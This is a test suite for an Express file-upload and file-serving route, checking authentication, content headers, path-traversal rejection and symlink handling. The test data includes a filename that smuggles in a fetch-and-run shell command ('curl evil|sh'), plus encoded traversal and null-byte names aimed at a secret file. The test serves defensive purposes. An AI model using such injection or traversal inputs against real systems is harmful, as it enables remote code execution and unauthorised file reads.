import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import express from 'express';
import request from 'supertest';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
import type { AuthService } from '../services/auth-service.js';

vi.mock('../utils/logger.js', () => ({
  createLogger: () => ({
    log: vi.fn(),
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
    debug: vi.fn(),
  }),
}));

const controlDir = fs.mkdtempSync(path.join(os.tmpdir(), 'vt-files-'));
const uploads = path.join(controlDir, 'uploads');
const secret = path.join(controlDir, 'secret.txt');

async function makeApp() {
  process.env.VIBETUNNEL_CONTROL_DIR = controlDir;
  vi.resetModules();
  const { createFileRoutes } = await import('./files.js');
  const { createAuthMiddleware } = await import('../middleware/auth.js');
  const authService = {
    verifyToken: (token: string) =>
      token === 'good' ? { valid: true, userId: 'alice' } : { valid: false },
  } as unknown as AuthService;
  const app = express();
  app.use(
    '/api',
    createAuthMiddleware({ authService } as Parameters<typeof createAuthMiddleware>[0])
  );
  app.use('/api', createFileRoutes());
  return app;
}

describe('GET /api/files/:filename (uploaded images for the chat view)', () => {
  let app: express.Express;
  const auth = { Authorization: 'Bearer good' };

  beforeAll(async () => {
    app = await makeApp();
    fs.writeFileSync(path.join(uploads, 'photo-1.png'), Buffer.from([0x89, 0x50, 0x4e, 0x47]));
    fs.writeFileSync(secret, 'top secret');
    fs.symlinkSync(secret, path.join(uploads, 'link.png'));
  });

  afterAll(() => {
    fs.rmSync(controlDir, { recursive: true, force: true });
    delete process.env.VIBETUNNEL_CONTROL_DIR;
  });

  it('serves an uploaded file to an authenticated client, privately', async () => {
    const res = await request(app).get('/api/files/photo-1.png').set(auth);
    expect(res.status).toBe(200);
    expect(res.headers['content-type']).toBe('image/png');
    expect(res.headers['cache-control']).toContain('private');
    expect(res.headers['x-content-type-options']).toBe('nosniff');
  });

  it('shows images inline and makes anything else a download', async () => {
    fs.writeFileSync(path.join(uploads, 'notes-1.txt'), 'hello');
    const image = await request(app).get('/api/files/photo-1.png').set(auth);
    expect(image.headers['content-disposition']).toMatch(/^inline;/);
    const text = await request(app).get('/api/files/notes-1.txt').set(auth);
    expect(text.headers['content-disposition']).toMatch(/^attachment;/);
    expect(text.text).toBe('hello');
  });

  it('stores an upload whose extension is not a plain one without it', async () => {
    const res = await request(app)
      .post('/api/files/upload')
      .set(auth)
      .attach('file', Buffer.from('%PDF'), 'x.pdf;curl evil|sh');
    expect(res.status).toBe(200);
    expect(res.body.filename).toMatch(/^[0-9a-f-]{36}$/);
    const plain = await request(app)
      .post('/api/files/upload')
      .set(auth)
      .attach('file', Buffer.from('%PDF'), 'report.pdf');
    expect(plain.body.filename).toMatch(/^[0-9a-f-]{36}\.pdf$/);
  });

  it('rejects requests without credentials', async () => {
    const res = await request(app).get('/api/files/photo-1.png');
    expect(res.status).toBe(401);
  });

  it.each([
    '..%2Fsecret.txt',
    '%2E%2E%2Fsecret.txt',
    '..%5Csecret.txt',
    '.hidden',
    'a%00.png',
  ])('rejects traversal attempt %s', async (name) => {
    const res = await request(app).get(`/api/files/${name}`).set(auth);
    expect([400, 404]).toContain(res.status);
    expect(res.text).not.toContain('top secret');
  });

  it('does not follow a symlink out of the uploads directory', async () => {
    const res = await request(app).get('/api/files/link.png').set(auth);
    expect(res.status).toBe(404);
    expect(res.text).not.toContain('top secret');
  });
});
